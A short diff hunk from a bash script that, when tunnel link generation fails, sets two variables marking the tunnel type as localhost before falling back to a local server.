@@ -873,6 +873,8 @@ checklink() {
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Error in generating the link"
 		echo -ne "\n${RED}[${WHITE}-${RED}]${GREEN} Starting localhost. You might need to start tunneler manually"
 		sleep 5
+		tutype="LocalHost"
+                tuid="localhost"
 		start_localhost
 	else
 		cusurl
